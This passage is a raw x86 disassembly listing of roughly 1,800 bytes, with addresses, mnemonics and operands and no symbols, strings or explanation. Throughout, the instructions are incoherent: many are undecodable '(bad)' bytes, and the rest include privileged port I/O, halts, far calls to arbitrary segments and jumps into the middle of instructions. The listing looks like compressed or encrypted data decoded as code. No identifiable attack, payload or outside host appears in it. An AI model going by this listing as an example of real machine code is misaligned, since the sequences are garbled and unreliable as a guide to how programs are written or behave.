  41a844:	dec    ebp
  41a845:	xchg   ecx,eax
  41a846:	cbw    
  41a848:	add    BYTE PTR [edi+eiz*8],0x71
  41a84c:	push   ecx
  41a84d:	shl    BYTE PTR [edx],0x45
  41a850:	jl     0x41a8bd
  41a852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a853:	inc    esp
  41a854:	and    BYTE PTR [edi-0x11],bl
  41a857:	stos   BYTE PTR es:[edi],al
  41a858:	mov    BYTE PTR [edi-0x635d18a3],al
  41a85e:	xchg   edi,eax
  41a85f:	sub    BYTE PTR [ebx],0x41
  41a862:	gs mov dl,0x20
  41a865:	les    ebx,FWORD PTR [esi-0x4a]
  41a868:	fiadd  DWORD PTR [eax]
  41a86a:	pop    ebp
  41a86b:	mov    bl,0x46
  41a86d:	cmp    ecx,ebp
  41a86f:	gs loopne 0x41a84e
  41a872:	loope  0x41a8e0
  41a874:	sub    BYTE PTR [edi-0x2a],0xa8
  41a878:	adc    BYTE PTR [eax+0x770b03a2],al
  41a87e:	daa    
  41a87f:	xlat   BYTE PTR ds:[ebx]
  41a880:	xchg   ebp,eax
  41a881:	cmp    dh,dh
  41a883:	imul   ebp,DWORD PTR [ebx+0x69],0x81e3fc56
  41a88a:	sub    cl,cl
  41a88c:	ret    
  41a88d:	cs stos BYTE PTR es:[edi],al
  41a88f:	dec    ecx
  41a890:	aas    
  41a891:	test   eax,0xa6d033b
  41a896:	mov    ds:0x9bc0a273,al
  41a89b:	mov    ds:0x2978e82b,al
  41a8a0:	out    dx,al
  41a8a1:	loop   0x41a8c1
  41a8a3:	clc    
  41a8a4:	adc    bh,BYTE PTR [eax-0x12e25903]
  41a8aa:	out    0xb5,eax
  41a8ac:	jp     0x41a8f0
  41a8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8af:	lods   eax,DWORD PTR ds:[esi]
  41a8b0:	cmp    eax,0xa23eba2e
  41a8b5:	mov    eax,0x5483c612
  41a8ba:	inc    eax
  41a8bb:	mov    DWORD PTR [edi+0x20],esi
  41a8be:	adc    BYTE PTR [eax+0x21],bl
  41a8c1:	je     0x41a8f9
  41a8c3:	pop    ecx
  41a8c4:	popa   
  41a8c5:	mov    BYTE PTR [ebx-0x40],bh
  41a8c8:	in     eax,dx
  41a8c9:	dec    ecx
  41a8ca:	les    esp,FWORD PTR [ebp-0x47dabadc]
  41a8d0:	test   BYTE PTR [ebx-0x76],bl
  41a8d3:	dec    ecx
  41a8d4:	dec    edx
  41a8d5:	jl     0x41a8cc
  41a8d7:	stos   DWORD PTR es:[edi],eax
  41a8d8:	repnz adc ch,BYTE PTR [edx]
  41a8db:	sti    
  41a8dc:	fdivr  QWORD PTR [ebx]
  41a8de:	lods   al,BYTE PTR ds:[esi]
  41a8e0:	adc    al,0x28
  41a8e2:	dec    ebx
  41a8e3:	ret    
  41a8e4:	aam    0xa4
  41a8e6:	push   cs
  41a8e7:	call   0x13dbbc5a
  41a8ec:	ins    DWORD PTR es:[edi],dx
  41a8ed:	lea    esi,[ecx-0x21]
  41a8f0:	jle    0x41a967
  41a8f2:	sbb    BYTE PTR [eax-0x726c5f9c],dl
  41a8f8:	cmp    al,0x19
  41a8fa:	and    dl,al
  41a8fc:	mov    eax,ds:0xa6e3384a
  41a901:	and    eax,edx
  41a903:	adc    DWORD PTR [edx+0x27bc67b1],ebx
  41a909:	xchg   ecx,eax
  41a90a:	das    
  41a90b:	pop    ebp
  41a90c:	ds inc ecx
  41a90e:	sub    al,0xb6
  41a911:	jb     0x41a8d5
  41a913:	fadd   QWORD PTR [ebp+eax*4+0x1e742031]
  41a91a:	or     al,0x70
  41a91c:	push   edi
  41a91d:	xchg   esi,eax
  41a91e:	clc    
  41a91f:	sub    ebx,DWORD PTR [ecx-0xe]
  41a922:	and    BYTE PTR [eax+0x4a],ah
  41a925:	das    
  41a926:	xchg   edi,eax
  41a927:	mov    eax,0x55d4d8f0
  41a92c:	call   0xacaf:0x6909e36d
  41a933:	inc    ebx
  41a934:	cwde   
  41a935:	sbb    al,0x10
  41a937:	dec    esp
  41a938:	mov    ds:0x8796d799,al
  41a93d:	add    al,0x20
  41a93f:	cmp    BYTE PTR [ebp-0x2412294f],ah
  41a945:	ja     0x1995eb20
  41a94b:	repz (bad) 
  41a94e:	ret    0xa3
  41a951:	das    
  41a952:	sar    BYTE PTR [esi+0x42],1
  41a955:	lods   eax,DWORD PTR ds:[esi]
  41a956:	mov    DWORD PTR [edi-0x5ed2be82],0x6bea55d7
  41a960:	push   eax
  41a961:	and    bl,BYTE PTR [edx+0x30925d82]
  41a967:	in     al,0x3a
  41a969:	popf   
  41a96a:	add    esp,ecx
  41a96c:	mov    eax,ds:0xc25eec8f
  41a971:	mov    ebp,0x4a0e10a9
  41a976:	outs   dx,BYTE PTR ds:[esi]
  41a977:	jp     0x41a905
  41a979:	aam    0x6d
  41a97b:	cdq    
  41a97c:	es push 0xffffffef
  41a97f:	fnsave [ecx+0xa]
  41a982:	pop    esp
  41a983:	daa    
  41a984:	ins    DWORD PTR es:[edi],dx
  41a985:	adc    eax,0xbfe05eef
  41a98a:	sti    
  41a98b:	dec    esp
  41a98c:	int3   
  41a98d:	cmp    al,BYTE PTR [ebx+0x57b2b05f]
  41a993:	fisttp WORD PTR [ebx+0x716fd21d]
  41a999:	adc    BYTE PTR [eax-0x55f5ce3d],dh
  41a99f:	mov    bh,0x92
  41a9a1:	push   es
  41a9a2:	clc    
  41a9a3:	daa    
  41a9a4:	cld    
  41a9a5:	add    dh,bl
  41a9a7:	outs   dx,BYTE PTR ds:[esi]
  41a9a8:	or     edx,edi
  41a9aa:	(bad)  
  41a9ab:	lods   eax,DWORD PTR ds:[esi]
  41a9ac:	aaa    
  41a9ad:	dec    ebx
  41a9ae:	inc    ecx
  41a9af:	(bad)  
  41a9b0:	scas   al,BYTE PTR es:[edi]
  41a9b1:	call   0x565f:0xa2f5f839
  41a9b8:	inc    edi
  41a9b9:	adc    eax,0x86b5dc46
  41a9be:	popw   es
  41a9c0:	mov    ebp,DWORD PTR [eax]
  41a9c2:	mov    BYTE PTR [ebx+ebp*4+0xb225ce5],cl
  41a9c9:	jnp    0x41a957
  41a9cb:	push   esp
  41a9cc:	mov    ds:0x19cc9eee,al
  41a9d1:	loopne 0x41a95e
  41a9d3:	jnp    0x41aa0b
  41a9d5:	or     DWORD PTR ds:0x84a0c127,ebp
  41a9db:	xor    ebx,DWORD PTR [edi+0x1d5ac6ac]
  41a9e1:	push   ecx
  41a9e2:	imul   esp,DWORD PTR [edx+ecx*4-0x5f],0x454dcbb1
  41a9ea:	adc    ah,ah
  41a9ec:	lds    ecx,FWORD PTR [ecx+ecx*2+0x2898debf]
  41a9f3:	or     DWORD PTR [eax+0x727ae482],0xffffffe7
  41a9fa:	inc    ecx
  41a9fb:	jmp    0xc3ee07f0
  41aa00:	dec    ebx
  41aa02:	pop    ebp
  41aa03:	inc    esp
  41aa04:	jmp    0xac1b85ab
  41aa09:	popf   
  41aa0a:	enter  0xb140,0x79
  41aa0e:	sub    DWORD PTR [edi+0x58],eax
  41aa11:	jmp    0x6f3199f8
  41aa16:	dec    ebp
  41aa17:	push   es
  41aa18:	xchg   edi,eax
  41aa19:	into   
  41aa1a:	pop    esp
  41aa1b:	pop    ds
  41aa1c:	fnstcw WORD PTR [ecx+esi*1+0x10]
  41aa20:	jne    0x41aa02
  41aa22:	mov    eax,ds:0x1cafe810
  41aa27:	pop    ecx
  41aa28:	mov    dh,0x92
  41aa2a:	stos   DWORD PTR es:[edi],eax
  41aa2b:	cs into 
  41aa2d:	out    dx,eax
  41aa2e:	xor    DWORD PTR [esi+0x4591f10d],0xaf9ac90
  41aa38:	or     al,0xfd
  41aa3a:	cmp    BYTE PTR [ebx+0x7e613186],ah
  41aa40:	adc    ecx,DWORD PTR [ebp-0x5a]
  41aa43:	xor    BYTE PTR [ebx+0x6c],bh
  41aa46:	push   esp
  41aa47:	aaa    
  41aa48:	sub    eax,0xdcc3000e
  41aa4d:	fisttp QWORD PTR [ebp+esi*1+0x35]
  41aa51:	xchg   ebx,eax
  41aa52:	ss test al,0x2f
  41aa55:	dec    ebx
  41aa56:	scas   eax,DWORD PTR es:[edi]
  41aa57:	pusha  
  41aa58:	cmp    DWORD PTR [edi-0x2959597f],edi
  41aa5e:	(bad)  
  41aa5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa60:	push   edi
  41aa61:	adc    al,0x6
  41aa63:	sub    bh,cl
  41aa65:	jmp    0x41aad7
  41aa67:	adc    eax,0xbf3eb1f3
  41aa6c:	push   ecx
  41aa6d:	ins    DWORD PTR es:[edi],dx
  41aa6e:	popf   
  41aa6f:	xchg   esp,eax
  41aa70:	or     esp,DWORD PTR [ebx]
  41aa72:	dec    ebx
  41aa73:	push   edi
  41aa74:	inc    esi
  41aa75:	mov    es:0xc2f7506c,eax
  41aa7b:	xor    eax,0x7fd4dd41
  41aa80:	bound  ecx,QWORD PTR [ebx]
  41aa82:	test   al,0x28
  41aa84:	mov    WORD PTR [edx+0x194b9b4],cs
  41aa8a:	ret    0xa84b
  41aa8d:	(bad)
  41aa90:	jle    0x41aa6a
  41aa92:	sbb    al,0xb0
  41aa94:	cmp    al,0x9
  41aa96:	push   eax
  41aa97:	jbe    0x41ab0f
  41aa99:	std    
  41aa9a:	je     0x41aa7b
  41aa9c:	cmp    BYTE PTR [ecx+edx*8+0x9456ac2],0xcb
  41aaa4:	in     al,dx
  41aaa5:	mov    DWORD PTR [ebx+0x7b],edx
  41aaa8:	jmp    0xb51f86ac
  41aaad:	mov    esi,DWORD PTR [eax+0x60]
  41aab0:	aad    0x44
  41aab2:	mov    ebx,0x2f90b3e
  41aab7:	int3   
  41aab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aab9:	xor    eax,DWORD PTR [edi+0x6f]
  41aabc:	mov    bl,0x3c
  41aabe:	iret   
  41aabf:	push   es
  41aac0:	shl    DWORD PTR [ecx+0x7fa00523],0x41
  41aac7:	pop    eax
  41aac8:	push   cs
  41aac9:	xchg   BYTE PTR [esi+0x34],bh
  41aacc:	into   
  41aacd:	lods   eax,DWORD PTR ds:[si]
  41aacf:	ins    DWORD PTR es:[edi],dx
  41aad0:	xchg   edi,eax
  41aad1:	sbb    BYTE PTR [eax],cl
  41aad3:	jns    0x41aad9
  41aad5:	loope  0x41aa59
  41aad7:	push   es
  41aad8:	push   ebp
  41aad9:	out    0x12,eax
  41aadb:	push   eax
  41aadc:	fstp   TBYTE PTR [edx+edi*4+0x51]
  41aae0:	es popa 
  41aae2:	push   ss
  41aae3:	sbb    ebp,DWORD PTR [eax-0x52a0cd89]
  41aae9:	cdq    
  41aaea:	aaa    
  41aaeb:	and    bl,BYTE PTR [edi-0x640b35e0]
  41aaf1:	outs   dx,DWORD PTR ds:[esi]
  41aaf2:	xlat   BYTE PTR gs:[ebx]
  41aaf4:	mov    ch,0x1e
  41aaf6:	or     al,0x88
  41aaf8:	lahf   
  41aaf9:	jns    0x41ab11
  41aafb:	in     eax,0xbb
  41aafd:	adc    eax,0x35953d02
  41ab02:	scas   eax,DWORD PTR es:[edi]
  41ab03:	ret    
  41ab04:	pop    ebp
  41ab05:	jae    0x41ab26
  41ab07:	bound  ebx,QWORD PTR [eax]
  41ab09:	adc    al,0xf8
  41ab0b:	add    ecx,DWORD PTR [edi-0x2e]
  41ab0e:	lock add al,0x5c
  41ab11:	mov    dh,0xdf
  41ab13:	jne    0x41aacc
  41ab15:	push   ss
  41ab16:	(bad)  
  41ab17:	cs js  0x41ab71
  41ab1a:	sbb    BYTE PTR [ebx-0x54],al
  41ab1d:	jae    0x41ab0f
  41ab1f:	pop    ds
  41ab20:	push   ebx
  41ab21:	push   0xffffffd8
  41ab23:	addr16 aad 0xc0
  41ab26:	in     al,0xb2
  41ab28:	dec    ebp
  41ab29:	call   0xae5d:0x3d2984b0
  41ab30:	out    0x67,eax
  41ab32:	push   ecx
  41ab33:	cld    
  41ab34:	rcr    bl,0xea
  41ab37:	lahf   
  41ab38:	jg     0x41ab6a
  41ab3a:	push   eax
  41ab3b:	push   ecx
  41ab3c:	retf   
  41ab3d:	push   ebx
  41ab3e:	out    0xd2,al
  41ab40:	push   0x6c0d244d
  41ab45:	and    al,0xe2
  41ab47:	add    dh,bl
  41ab49:	mov    cl,BYTE PTR [eax+eax*2]
  41ab4c:	(bad)  
  41ab4d:	cmc    
  41ab4e:	dec    ecx
  41ab4f:	push   edx
  41ab50:	out    dx,eax
  41ab51:	xchg   ecx,eax
  41ab52:	inc    eax
  41ab53:	inc    ebp
  41ab54:	lea    edx,[esi-0x344b675f]
  41ab5a:	(bad)  
  41ab5b:	cmp    al,0x99
  41ab5d:	in     eax,0xe2
  41ab5f:	loop   0x41abd8
  41ab61:	shr    eax,1
  41ab63:	add    BYTE PTR [ebp+0xfcc50b2],al
  41ab69:	ss jle 0x41abb2
  41ab6c:	(bad)  
  41ab6d:	xor    ah,BYTE PTR [edx-0xc]
  41ab70:	test   al,0x3
  41ab72:	out    0xb9,eax
  41ab74:	fcmovu st,st(5)
  41ab76:	pop    edi
  41ab77:	cmc    
  41ab78:	es pop ebp
  41ab7a:	leave  
  41ab7b:	push   edi
  41ab7c:	in     al,dx
  41ab7d:	mov    dh,0x1d
  41ab7f:	fstp   st(2)
  41ab81:	jle    0x41abdf
  41ab83:	std    
  41ab84:	push   eax
  41ab85:	cmp    ebx,eax
  41ab87:	aas    
  41ab88:	bound  edx,QWORD PTR ds:0x441a8de0
  41ab8e:	lahf   
  41ab8f:	adc    DWORD PTR [edx-0x53],edx
  41ab92:	jns    0x41abbe
  41ab94:	aam    0xc1
  41ab96:	fstp   QWORD PTR [edx]
  41ab98:	xchg   ebp,eax
  41ab99:	idiv   DWORD PTR [ebp+0x73]
  41ab9c:	lods   al,BYTE PTR ds:[esi]
  41ab9d:	mov    esi,0x4034d0a9
  41aba2:	xor    al,0x6c
  41aba4:	enter  0xd703,0x2e
  41aba8:	test   eax,0xd0d64066
  41abad:	push   esi
  41abae:	les    esi,FWORD PTR [esi]
  41abb0:	hlt    
  41abb1:	(bad)  
  41abb2:	ja     0x41ab66
  41abb4:	jno    0x41ab41
  41abb6:	jmp    0x70731f35
  41abbb:	xchg   esp,eax
  41abbc:	fwait
  41abbd:	ja     0x41ab52
  41abbf:	aad    0x60
  41abc1:	dec    eax
  41abc2:	daa    
  41abc3:	mov    dh,0xd9
  41abc5:	loop   0x41abff
  41abc7:	bound  ebx,QWORD PTR [ebx]
  41abc9:	and    eax,DWORD PTR [edi-0x5494592c]
  41abcf:	outs   dx,BYTE PTR ds:[esi]
  41abd0:	leave  
  41abd1:	sub    al,0x86
  41abd3:	(bad)  
  41abd4:	pop    es
  41abd5:	int    0xfd
  41abd7:	mov    bl,0x51
  41abd9:	fucom  st(1)
  41abdb:	mov    dl,0xa3
  41abdd:	(bad)
  41abe1:	mov    edi,ecx
  41abe3:	add    BYTE PTR ds:0x217db862,ch
  41abe9:	(bad)  
  41abea:	adc    eax,0xa7465408
  41abef:	pop    esi
  41abf0:	push   ss
  41abf1:	ror    bl,1
  41abf3:	add    al,0xeb
  41abf5:	inc    esi
  41abf6:	add    dl,BYTE PTR [ecx+0x5027a0f8]
  41abfc:	mov    al,0x63
  41abfe:	shr    bh,1
  41ac00:	push   ss
  41ac01:	lock hlt 
  41ac03:	inc    ebp
  41ac04:	scas   al,BYTE PTR es:[edi]
  41ac05:	pusha  
  41ac06:	dec    ecx
  41ac07:	psraw  mm5,mm3
  41ac0a:	cmp    BYTE PTR [eax-0x59],dl
  41ac0d:	shr    BYTE PTR [edx-0x4868aab1],cl
  41ac13:	mov    WORD PTR [esi],es
  41ac15:	je     0x41ac3d
  41ac17:	mov    esi,eax
  41ac19:	sub    dh,bh
  41ac1b:	in     eax,0xa3
  41ac1d:	ins    BYTE PTR es:[edi],dx
  41ac1e:	mov    ebp,0x22364240
  41ac23:	(bad)  
  41ac24:	jecxz  0x41abfc
  41ac26:	sahf   
  41ac27:	mov    ch,0xa3
  41ac29:	push   ss
  41ac2a:	dec    esp
  41ac2b:	xor    al,0x5f
  41ac2d:	cdq    
  41ac2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac2f:	push   ecx
  41ac30:	mov    dl,0x6e
  41ac32:	aam    0x5d
  41ac34:	stc    
  41ac35:	ret    
  41ac36:	mov    ebx,0x65f48cef
  41ac3b:	in     al,dx
  41ac3c:	out    dx,al
  41ac3d:	mov    es,WORD PTR [esi+0x1a]
  41ac40:	call   0xd742:0x94c92574
  41ac47:	push   0x6d
  41ac49:	nop
  41ac4a:	xor    DWORD PTR [esi],ebx
  41ac4c:	nop
  41ac4d:	stos   DWORD PTR es:[edi],eax
  41ac4e:	fdiv   st,st(3)
  41ac50:	jmp    0x23d179ae
  41ac55:	cmp    ebp,DWORD PTR [edi]
  41ac57:	mov    cl,0xa5
  41ac59:	adc    dh,ah
  41ac5b:	out    0xc5,eax
  41ac5d:	mov    ebp,0x64dc9432
  41ac62:	stc    
  41ac63:	mov    al,ds:0xf0240050
  41ac68:	push   ds
  41ac69:	es sbb dh,ah
  41ac6c:	and    BYTE PTR [ecx+0x54],al
  41ac6f:	mov    bh,0x4e
  41ac71:	test   DWORD PTR [ebx],edx
  41ac73:	and    edx,ebp
  41ac75:	xchg   ecx,eax
  41ac76:	mov    ds:0x992cba,al
  41ac7b:	ror    DWORD PTR [ecx+ebp*8+0x45],1
  41ac7f:	inc    ebx
  41ac80:	xchg   DWORD PTR [ebp-0x7b],esp
  41ac83:	jge    0x41acc9
  41ac85:	dec    ebx
  41ac86:	jge    0x41ac6c
  41ac88:	loope  0x41ac63
  41ac8a:	mov    al,ds:0x40a3c801
  41ac8f:	retf   0x4b02
  41ac92:	in     al,0x16
  41ac94:	xchg   esi,eax
  41ac95:	inc    esi
  41ac96:	in     eax,dx
  41ac97:	push   cs
  41ac98:	adc    BYTE PTR [eax+0x4a30f13f],ch
  41ac9e:	jne    0x41aca2
  41aca0:	xchg   BYTE PTR [eax+edx*4+0x12],ch
  41aca4:	jg     0x41ac6e
  41aca6:	test   BYTE PTR [eax+0x5a],dl
  41aca9:	pop    edi
  41acaa:	add    BYTE PTR [ebx-0x2b],ch
  41acad:	mov    edx,0xfd3a83ab
  41acb2:	fstp   QWORD PTR [ebp+0x34b5b1c3]
  41acb8:	cwde   
  41acb9:	stos   DWORD PTR es:[edi],eax
  41acba:	outs   dx,DWORD PTR ds:[esi]
  41acbb:	rcr    DWORD PTR [eax-0x64],1
  41acbe:	push   0x31
  41acc0:	out    dx,eax
  41acc1:	pop    edi
  41acc2:	pop    ebx
  41acc3:	xor    eax,0x36b5da21
  41acc8:	pop    esi
  41acc9:	retf   
  41acca:	inc    esp
  41accb:	fcom   DWORD PTR [esi-0x51a3c8dd]
  41acd1:	xchg   ebx,eax
  41acd2:	xchg   ecx,eax
  41acd3:	inc    ebx
  41acd4:	retf   0xfca1
  41acd7:	xchg   esi,eax
  41acd8:	in     eax,dx
  41acd9:	mov    bh,BYTE PTR [ecx]
  41acdb:	xlat   BYTE PTR ds:[ebx]
  41acdc:	sti    
  41acdd:	dec    esp
  41acde:	loopne 0x41ad3e
  41ace0:	inc    esp
  41ace1:	sub    bh,BYTE PTR [ecx+0x3ba3583b]
  41ace7:	xchg   edi,eax
  41ace8:	sub    ch,BYTE PTR [edx+0x15]
  41aceb:	jmp    0x322f:0xb156c55c
  41acf2:	in     eax,dx
  41acf3:	(bad)  
  41acf4:	xor    al,bl
  41acf6:	arpl   WORD PTR [eax-0x64510473],dx
  41acfc:	or     BYTE PTR [edi-0x4cd3cf88],dl
  41ad02:	retf   0xe6dc
  41ad05:	mov    edx,DWORD PTR [edi]
  41ad07:	scas   al,BYTE PTR es:[edi]
  41ad08:	and    al,0xa6
  41ad0a:	add    BYTE PTR [edi+0x78352257],bl
  41ad10:	ins    DWORD PTR es:[edi],dx
  41ad11:	shl    DWORD PTR [ecx],1
  41ad13:	adc    dh,BYTE PTR [edi+0x3a]
  41ad16:	sbb    edi,DWORD PTR [ebp+0x1fefa70]
  41ad1c:	lods   eax,DWORD PTR ds:[esi]
  41ad1d:	and    BYTE PTR [edi],bl
  41ad1f:	fs out dx,al
  41ad21:	or     al,BYTE PTR [ebp-0x40]
  41ad24:	push   edi
  41ad25:	sub    al,0x2
  41ad27:	int3   
  41ad28:	and    DWORD PTR [ecx],ecx
  41ad2a:	adc    al,0x50
  41ad2c:	adc    bh,BYTE PTR fs:[edi+0x3832ad0d]
  41ad33:	ins    BYTE PTR es:[edi],dx
  41ad34:	inc    edi
  41ad35:	and    eax,0x9023c060
  41ad3a:	sbb    al,0x26
  41ad3c:	xchg   edx,eax
  41ad3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad3e:	cmp    DWORD PTR [eax],edi
  41ad40:	xchg   ebp,eax
  41ad41:	and    DWORD PTR [ecx],edx
  41ad43:	lods   al,BYTE PTR ds:[esi]
  41ad44:	inc    edx
  41ad45:	ret    0xf041
  41ad48:	inc    ecx
  41ad49:	xchg   esp,eax
  41ad4a:	(bad)  
  41ad4b:	xor    al,0x27
  41ad4d:	or     BYTE PTR [ebp-0x1db18ecf],ch
  41ad53:	ret    0x553b
  41ad56:	xchg   esi,eax
  41ad57:	xchg   ebx,eax
  41ad58:	call   0x3d19e8fb
  41ad5d:	add    al,0x72
  41ad5f:	push   0xffffff91
  41ad61:	daa    
  41ad62:	popa   
  41ad63:	jb     0x41ada0
  41ad65:	push   ecx
  41ad66:	pop    edi
  41ad67:	fnstenv [edi]
  41ad69:	add    DWORD PTR [esp+esi*1+0x3b878d61],edi
  41ad70:	mov    cl,0x5a
  41ad72:	sbb    DWORD PTR [eax+eiz*8],esi
  41ad75:	loope  0x41ad7e
  41ad77:	inc    esp
  41ad78:	(bad)  
  41ad79:	sbb    al,0x1c
  41ad7b:	xor    DWORD PTR [edi-0x7a],ebx
  41ad7e:	mov    ch,0xa6
  41ad80:	shr    BYTE PTR [ebx+ecx*4+0x70],0xf3
  41ad85:	pop    edi
  41ad86:	daa    
  41ad87:	adc    ebp,ecx
  41ad89:	and    DWORD PTR [edi+0x79],eax
  41ad8c:	shl    DWORD PTR [ebp-0x115c3e0a],1
  41ad92:	sahf   
  41ad93:	in     eax,dx
  41ad94:	dec    edx
  41ad95:	xchg   BYTE PTR [esi-0x11],bh
  41ad98:	pop    es
  41ad99:	popf   
  41ad9a:	jge    0x41ae06
  41ad9c:	(bad)  
  41ad9d:	push   ebx
  41ad9e:	adc    eax,0x8e592a59
  41ada3:	mov    ds:0x99f9fd6c,al
  41ada8:	mov    BYTE PTR [ecx+0x7e1a72c6],ch
  41adae:	in     eax,dx
  41adaf:	mov    ah,0x4b
  41adb1:	push   esp
  41adb2:	out    dx,eax
  41adb3:	cmp    dl,BYTE PTR [edx]
  41adb5:	mov    bl,BYTE PTR [ebx-0x1d]
  41adb8:	sbb    BYTE PTR [esi-0x261e586],bh
  41adbe:	(bad)  [eax+0xad93bba]
  41adc4:	adc    bl,BYTE PTR es:[edx]
  41adc7:	dec    esp
  41adc8:	or     eax,0xf5971810
  41adcd:	adc    DWORD PTR [edx],0xffffffd7
  41add0:	int3   
  41add1:	jo     0x41ae1e
  41add3:	jb     0x41adbb
  41add5:	and    eax,0xdd183a7e
  41adda:	pop    ebp
  41addb:	push   cs
  41addc:	xchg   ecx,eax
  41addd:	pop    ds
  41adde:	pop    edx
  41addf:	mov    edx,0x194bc7d6
  41ade4:	inc    ebx
  41ade5:	xlat   BYTE PTR ds:[ebx]
  41ade6:	cld    
  41ade7:	out    dx,eax
  41ade8:	mov    BYTE PTR [ebx],cl
  41adea:	jno    0x41ae38
  41adec:	bsf    edi,DWORD PTR [esi]
  41adef:	push   0xecbaf67b
  41adf4:	cmc    
  41adf5:	mov    al,0xb1
  41adf7:	mov    gs,WORD PTR [ecx-0x5b8346ea]
  41adfd:	js     0x41ae0d
  41adff:	adc    ah,BYTE PTR [edi-0x31]
  41ae02:	rcl    BYTE PTR [edx+esi*4+0x20],0xb
  41ae07:	loopne 0x41ae05
  41ae09:	(bad)  
  41ae0a:	or     eax,0xbbd54bb8
  41ae0f:	popf   
  41ae10:	in     al,0x98
  41ae12:	adc    dh,BYTE PTR [eax]
  41ae14:	sbb    eax,0xd1a0210d
  41ae19:	mov    ecx,0x4fe067e2
  41ae1e:	popf   
  41ae1f:	mov    bl,0xdb
  41ae21:	add    DWORD PTR [ebx+0x3d0dae3b],0xfca6eaf0
  41ae2b:	call   0x92b7:0x9eb6603e
  41ae32:	pop    eax
  41ae33:	repz leave 
  41ae35:	jmp    0x81b5:0x38616bb1
  41ae3c:	mov    ah,0x57
  41ae3e:	addr16 (bad) 
  41ae40:	cmp    eax,0x7e0fb2c6
  41ae45:	sti    
  41ae46:	xor    BYTE PTR [esi+0xe],cl
  41ae49:	mov    gs,WORD PTR [eax-0x80]
  41ae4c:	ds push esi
  41ae4e:	dec    eax
  41ae4f:	cmp    al,0x77
  41ae51:	data16 (bad) [ebx]
  41ae54:	cmp    DWORD PTR [edi],eax
  41ae56:	retf   0x8f34
  41ae59:	jl     0x41ae9f
  41ae5b:	shr    DWORD PTR [edx],0xa9
  41ae5e:	fucomp st(4)
  41ae60:	lods   al,BYTE PTR ds:[esi]
  41ae61:	data16 and al,0x7d
  41ae64:	aaa    
  41ae65:	push   esi
  41ae66:	mov    ebp,0xa630f04f
  41ae6b:	or     eax,0x7d35dee0
  41ae70:	sahf   
  41ae71:	mov    ebp,DWORD PTR [edi+0x2a]
  41ae74:	in     al,dx
  41ae75:	neg    DWORD PTR ds:0x81e4607a
  41ae7b:	adc    ch,BYTE PTR [ebp+0x4]
  41ae7e:	add    ebp,DWORD PTR [edi+0x54]
  41ae81:	cmp    eax,0xd97746
  41ae86:	lea    edx,[edi-0xdea0b2a]
  41ae8c:	pop    ss
  41ae8d:	xchg   esp,eax
  41ae8e:	pop    ds
  41ae8f:	push   ecx
  41ae90:	inc    esi
  41ae91:	jmp    0x5d512b80
  41ae96:	and    al,BYTE PTR [esi-0x71ade688]
  41ae9c:	pop    ss
  41ae9d:	enter  0x71f7,0x99
  41aea1:	sub    BYTE PTR [edi+0x4ff49c01],ch
  41aea7:	dec    ebx
  41aea8:	stos   BYTE PTR es:[edi],al
  41aea9:	sub    DWORD PTR [ebx],0xffffff83
  41aeac:	inc    BYTE PTR [edx]
  41aeae:	ror    DWORD PTR [esi],1
  41aeb0:	push   0x50
  41aeb2:	pop    ds
  41aeb3:	in     eax,dx
  41aeb4:	les    eax,FWORD PTR [edx-0x41]
  41aeb7:	sub    DWORD PTR [edx],edx
  41aeb9:	and    BYTE PTR [edx-0x58615a86],0x59
  41aec0:	push   eax
  41aec1:	mov    ecx,ebx
  41aec3:	shl    BYTE PTR ds:[esi-0x49],0x76
  41aec8:	jo     0x41ae81
  41aeca:	xor    al,0xa9
  41aecc:	adc    eax,0xc08c1441
  41aed1:	xlat   BYTE PTR ds:[ebx]
  41aed2:	bound  esp,QWORD PTR [esi+0x6d]
  41aed5:	mov    bh,0x0
  41aed7:	jecxz  0x41aef0
  41aed9:	mov    ebx,0x784ecb9b
  41aede:	mov    al,0x39
  41aee0:	adc    bl,cl
  41aee2:	pop    edx
  41aee3:	jg     0x41aed1
  41aee5:	and    cl,BYTE PTR [ecx]
  41aee7:	add    eax,0x5cfb429e
  41aeec:	gs xchg ebp,eax
  41aeee:	test   al,0x5
  41aef0:	lea    ebp,[edx+0x195d1010]
  41aef6:	fadd   QWORD PTR [ecx-0x2a62d9f3]
  41aefc:	add    eax,0x4fc57512
  41af01:	jo     0x41af03
  41af03:	vpaddb ymm2,ymm1,YMMWORD PTR [esi]
  41af07:	loope  0x41aeb3
  41af09:	mov    esp,DWORD PTR [eax+0x75]
  41af0c:	bound  edi,QWORD PTR [edi+edi*4]
  41af0f:	js     0x41af71
  41af11:	xor    al,0xc4
  41af13:	scas   al,BYTE PTR es:[edi]
  41af14:	xchg   ecx,eax
  41af15:	cmp    DWORD PTR [ebx+0x7b],ebp
  41af18:	mov    DWORD PTR [edx],esi
  41af1a:	call   0x93c7:0x566de37a
  41af21:	sahf   
  41af22:	mov    ah,0x6a
  41af24:	mov    ecx,ss
  41af26:	and    ebx,edx
  41af28:	xor    dh,BYTE PTR [ebx-0x57ee667e]
  41af2e:	adc    DWORD PTR [ecx-0x57],ecx
  41af31:	mov    ds:0x2307a62,eax
  41af36:	xchg   edi,eax
  41af37:	dec    edi
  41af38:	xor    BYTE PTR [edi],dh
  41af3a:	jno    0x41af8f
  41af3c:	push   ss
  41af3d:	stos   BYTE PTR es:[edi],al
  41af3e:	stc    
  41af3f:	bound  ecx,QWORD PTR ss:[esi]
  41af42:	adc    cl,BYTE PTR [edx]
  41af44:	or     DWORD PTR [esi+0x4cdc056e],ebx
  41af4a:	ja     0x41af63
  41af4c:	dec    eax
  41af4d:	mov    edx,0x6cd58c8d
  41af52:	outs   dx,DWORD PTR gs:[esi]
  41af54:	cmp    eax,0xbf426de7
  41af59:	xchg   esp,eax
  41af5a:	jne    0x41af7b
  41af5c:	add    bl,dh
  41af5e:	outs   dx,DWORD PTR ds:[esi]
  41af5f:	sbb    al,0xa6
  41af61:	stos   BYTE PTR es:[edi],al
  41af62:	mov    DWORD PTR [eax],edi
  41af64:	mov    ah,0xb6
  41af66:	mov    esi,0x69858e81
  41af6b:	sub    eax,0xf7c134ad
  41af70:	outs   dx,BYTE PTR ds:[esi]
  41af71:	scas   al,BYTE PTR es:[edi]
  41af72:	sbb    al,0xa
  41af74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
